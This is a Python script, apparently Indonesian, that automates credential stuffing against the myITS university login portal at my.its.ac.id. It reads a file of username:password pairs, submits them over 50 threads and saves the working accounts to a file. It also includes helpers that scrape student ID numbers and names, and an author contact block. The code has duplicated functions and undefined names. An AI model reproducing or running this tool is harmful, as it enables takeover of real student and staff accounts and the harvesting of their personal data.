import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
import os, time, random, platform, hashlib, sys, urllib.parse, requests.packages.urllib3
import os, time, platform, requests as req, requests.packages.urllib3
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install bahan selesai\nSilahkan restart script')
else:
	grey = '\x1b[90m'
	red = '\x1b[91m'
	green = '\x1b[92m'
	yellow = '\x1b[93m'
	blue = '\x1b[94m'
	purple = '\x1b[95m'
	cyan = '\x1b[96m'
	white = '\x1b[37m'
	flag = '\x1b[47;30m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	kd = '4.14.141-g2dd0cee'
	ok = []
	no = []
	result = []
	found = []
	error = []
	xtc = []

os.system('clear')
def itb(i, usr, pwd):
	url = 'https://my.its.ac.id/'
	res = req.Session()
	dat1 = res.get(url).text
	ref = bs(dat1, 'html.parser').findAll('input')
	client = ref[0]['value']
	respon = ref[1]['value']
	openid = ref[2]['value']
	state = ref[3]['value']
	prom = ref[4]['value']
	redi = ref[5]['value']
	nonce = ref[6]['value']
	pub = ref[9]['value']
	ctn = os.popen(f'node sys.js "{pub}" {usr} {pwd}').read().replace('\n','')
	data = {
		'client_id':client,
		'response_type':respon,
		'scope':openid,
		'state':state,
		'prompt':'',
		'redirect_uri':redi,
		'nonce':nonce,
		'username':usr,
		'password':pwd,
		'pubkey':pub,
		'content':ctn,
		'password_state':'true',
		'device_method':'',
	}
	status = bs(res.post('https://my.its.ac.id/signin', data=data).text,'html.parser').find('title').text
	if status == 'Dashboard &bullet myITS':
		print(f" {cyan}[{white}{i}{cyan}]{green} Found {white}㆔{green} {usr}{white}:{green}{pwd}")
		ok.append(i)
		with open('aktif_its.txt','a') as save:
			save.write(f'{usr}:{pwd}\n')
	elif status == 'Your password must be changed &bullet myITS':
		print(f" {cyan}[{white}{i}{cyan}]{green} Found {white}㆔{green} {usr}{white}:{green}{pwd}")
		ok.append(i)
		with open('aktif_its.txt','a') as save:
			save.write(f'{usr}:{pwd}\n')
	else:
		no.append(i)
		print(f" {cyan}[{white}{i}{cyan}]{red} Fail {white}㆔{red} {usr}{white}:{red}{pwd}")

def main():
	if kd == f"{me}":    
		gerak(f"{cyan}   _____ _________    _   __   _________   ___________\n{cyan}  / ___// ____/   |  / | / /  / ____/   | / ___/_  __/\n{cyan}  \__ \/ /   / /| | /  |/ /  / /_  / /| | \__ \ / /   \n{white} ___/ / /___/ ___ |/ /|  /  / __/ / ___ |___/ // /    \n{white}/____/\____/_/  |_/_/ |_/  /_/   /_/  |_/____//_/                                                           {white}\n    {cyan}[{off}{flag}FAST SCANNER BY NBL CODE{off}{cyan}]\n",0.001)
		print(f"{red}𑁋"*45)
		gerak(f"{cyan}╭━━━━━━━INFO AUTHOR━━━━━━━━━╮\n", 0.001) 
		gerak(f"{cyan}┃{white} AUTHOR : NBL CODE        {cyan} ┃\n",0.001)
		gerak(f"{cyan}┃{white} TOOLS  : Scanner Univ    {cyan} ┃\n",0.001)
		gerak(f"{cyan}┃{white} BY     : NBL CODE!! {cyan}      ┃ \n",0.001)
		print(f"{cyan}╰┳━━━━SCAN  UNIVERSITAS━━━━┳╯")
		gerak(f"{cyan} ┃{cyan}[{white}01{cyan}]{green}➤ {white}SCAN ITS        {cyan}   ┃\n",0.001) 	
		gerak(f"{cyan} ┃{cyan}[{white}02{cyan}]{green}➤ {white}KONTAK AUTHOR     {cyan} ┃\n",0.001)     
		gerak(f"{cyan} ╰┳━━━━━━━━━━━━━━━━━━━━━━━┳╯\n",0.001)
		select = input(f"{cyan}  ┃                       ┃\n {cyan} ╰━━━━━━━━━━━━━━━━━━━━━━━╯\n  {cyan}[{white}?{cyan}]{white} Pilih  : ")
		if select == '1':
		        xits()
		elif select == '5':
		        grab()
		elif select == '3':
		        grabb()
		elif select == '2':
				info()
def xits():					
		print("")
		print(f" {purple}[{white}+{purple}]{white} File harus berisi username & password")
		path = input(f" {purple}[{white}?{purple}]{white} Input file : ")
		with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f" {purple}[{white}+{purple}]{white} Total {len(lines)} baris terdeteksi")
				with ThreadPoolExecutor(max_workers=50) as crot:
					for line in lines:
						data = line.strip()
						user = data.split(':')[0]
						pswd = data.split(':')[1]
						if len(data) > 0:
							crot.submit(itb, count, user, pswd)
							count += 1
							continue
						simpan()	
						
				print("")
				print(f" {green}[{white}!{green}]{white} Scan selesai")
				print(f" {purple}[{white}*{purple}]{white} Found : {green}{len(ok)}")
				print(f" {purple}[{white}*{purple}]{white} Fail : {red}{len(no)}")
				print(f" {green}[{white}!{green}]{white} Akun aktif disimpan sebagai {green}aktif_its.txt")
				exit(f" {cyan}[{white}*{cyan}]{white} by : NBL CODE {green}~")
def info():	    
    gerak(f"    {cyan}WA {white}:{green} 085887578285\n",0.001) 
    gerak(f"    {cyan}FB {white}:{green} 085887578285\n",0.001) 
    gerak(f"    {cyan}IG {white}:{green} @nabil.bilnabil\n",0.001) 
    gerak(f"    {cyan}Telegram {white}:{green} @Farid404\n",0.001) 
    print("")
    print(f"\r{red}[{white}1{red}]{white} Kembali Scan")
    print(f"\r{red}[{white}2{red}]{white} exit")
    keluar = input(f"\n{red}[{white}?{red}]{white}> Pilih :  {white}")
    if keluar == "1":
	      main()
    elif keluar == "2":
	      exit()

def gerak(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)
        
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _		
	
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:17]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

if __name__ == '__main__':
	
	main()
	